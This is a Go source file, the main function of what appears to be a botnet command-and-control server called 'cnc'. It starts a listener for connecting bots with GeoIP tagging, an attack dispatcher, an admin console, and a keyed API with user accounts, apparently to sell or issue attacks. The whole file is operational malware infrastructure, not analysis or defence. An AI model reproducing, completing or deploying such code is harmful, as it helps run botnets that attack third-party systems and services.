// language: Go, file: cnc/cnc.go
package main

import (
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"

	"bigheights/cnc/internal/admin"
	"bigheights/cnc/internal/api"
	"bigheights/cnc/internal/attack"
	"bigheights/cnc/internal/auth"
	"bigheights/cnc/internal/botconn"
	"bigheights/cnc/internal/registry"
	"bigheights/cnc/internal/users"
)

func main() {
	log.SetFlags(log.LstdFlags | log.Lmicroseconds)
	log.SetPrefix("[cnc] ")

	cfg, err := loadConfig()
	if err != nil {
		log.Fatalf("config: %v", err)
	}

	// --- geoip ---
	geo := registry.NewGeoDB()
	if cfg.GeoIPPath != "" {
		if err := geo.Load(cfg.GeoIPPath); err != nil {
			log.Printf("geoip: %v — country breakdown will be empty", err)
		} else {
			log.Printf("geoip: table loaded")
		}
	}

	// --- users ---
	us := users.NewStore()
	us.SeedOwner(cfg.OwnerUser, cfg.OwnerPass)
	log.Printf("owner account: %s", cfg.OwnerUser)

	// --- api keys ---
	keys := auth.NewStore()
	if err := keys.Load(cfg.APIKeys); err != nil {
		log.Fatalf("api keys: %v", err)
	}
	log.Printf("api keys: %d loaded", len(cfg.APIKeys))

	// --- registry + dispatcher ---
	reg := registry.New()
	disp := attack.NewDispatcher(reg)

	// --- listeners ---
	bc := &botconn.Server{Addr: cfg.BotAddr, Reg: reg, Geo: geo}
	ad := admin.New(cfg.AdminAddr, reg, disp, us)
	ap := &api.Server{Addr: cfg.APIAddr, Reg: reg, Disp: disp, Users: us, Keys: keys}

	// --- start all doors ---
	errs := make(chan error, 3)
	go func() { log.Printf("bot listener on %s", cfg.BotAddr); errs <- bc.Listen() }()
	go func() { log.Printf("admin listener on %s", cfg.AdminAddr); errs <- ad.Listen() }()
	go func() { log.Printf("api listener on %s", cfg.APIAddr); errs <- ap.Listen() }()

	// --- wait for signal or fatal listener error ---
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)

	select {
	case s := <-sig:
		log.Printf("signal %v — shutting down", s)
	case err := <-errs:
		log.Printf("listener died: %v — shutting down", err)
	}

	bc.Close()
	ad.Close()
	time.Sleep(200 * time.Millisecond)
	log.Printf("cnc stopped")
}